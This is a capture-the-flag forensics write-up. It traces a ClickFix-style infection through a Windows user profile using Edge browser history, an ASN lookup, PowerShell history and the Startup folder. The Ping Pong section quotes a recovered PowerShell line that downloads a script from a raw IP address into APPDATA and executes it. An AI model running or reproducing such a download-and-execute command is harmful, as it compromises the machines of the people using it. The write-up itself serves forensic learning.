
![[Pasted image 20260419192750.png]]

The challenge file is actually a `User Profile Folder` from a windows machine.

![](<./img/Pasted image 20260419192939.png>)

This challenge asks us the date and time at which a particular website was accessed and it also prompted the user to run a powershell command.

We need the history of websites accessed using a browser like Chrome/Edge:-

The path for History of Edge is as follows:-

```
ayush-parab@Ubuntu-VM:~/ayush/CTF/CITCTF2026/click_may_fixed/kurt_backup/AppData/Local/Microsoft/Edge/User Data/Default$ file History
History: SQLite 3.x database, last written using SQLite version 3035005, file counter 2, database pages 31, cookie 0x18, schema 4, UTF-8, version-valid-for 2
```

The file is a `SQLite 3.X` database. So we open it using `DB browser for SQLite` and run the following query to get the timestamps in the format specified.

![[Pasted image 20260419125221.png]]

In entry number 2 of above output, the user searched about `Free RAM` in `bing` after which he clicked on a malicious site which has no domain name. Surely this must be the one we are looking for.

Using its timestamp, we get the flag!

Flag - `CIT{2026-04-18T07:07:26Z}`


# Autonomous - second challenge in the same chain

[![[Pasted image 20260419193639.png]]](https://github.com/Ayush-Parab/CTF-Writeups/blob/a1770485ec3ed76ab6f95989c996b49ad0dce47a/CIT-CTF-2026/CIT-CTF-2026/img/Pasted%20image%2020260419193639.png)

We have to search for `ASN` of the given malicious website. `ASN` is the Autonomous System Number which is used for BGP, a dynamic routing protocol.

A quick search on IPinfo for the given IP gives us the answer we are looking for!

![[Pasted image 20260419125445.png]]

Flag - `CIT{399562}`


# Ping Pong - 3rd challenge in this chain

[![[Pasted image 20260419193944.png]]](https://github.com/Ayush-Parab/CTF-Writeups/blob/a1770485ec3ed76ab6f95989c996b49ad0dce47a/CIT-CTF-2026/CIT-CTF-2026/img/Pasted%20image%2020260419193944.png)

To find the answer, we need to check what was the script that was executed.

The path for history of PowerShell commands run is as follows:

`/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine`

In the above directory, read `ConsoleHost_history.txt`

Output:-

```
ayush-parab@Ubuntu-VM:~/ayush/CTF/CITCTF2026/click_may_fixed/kurt_backup/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine$ more ConsoleHost_history.txt 
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
$p='unewhaven.com'; Test-Connection $p -Count 6 | Out-Null; $j='http://23.179.17.92/az.ps1'; $c=Join-Path $env:APPDATA 'DiskCleaner.ps1'; Start-BitsTransfer -Source $j -Desti
nation $c; & $c
```

From the above PowerShell script it is evident that we are pinging `unewhaven.com`

Flag - `CIT{unewhaven.com}`


# Start Me Up - Last challenge in this chain

![](<./img/Pasted image 20260419194448.png>)

We have to check for persistence! The title suggests that the malicious script `DiskCleaner.ps1` we saw in the previous challenge has been set to run automatically on startup for persistence.

We will check the startup folder at:-

`/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup`

We notice a text file there with the following output:-

```
ayush-parab@Ubuntu-VM:~/ayush/CTF/CITCTF2026/click_may_fixed/kurt_backup/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup$ cat e9fje2.txt 
Q0lUe3N0NHJ0X20zX3VwX2kxMV9uM3Yzcl9zdDBwfQ==
```

This appears to be a `base64` string, decoding it gives us our flag!

Flag - `CIT{st4rt_m3_up_i11_n3v3r_st0p}`


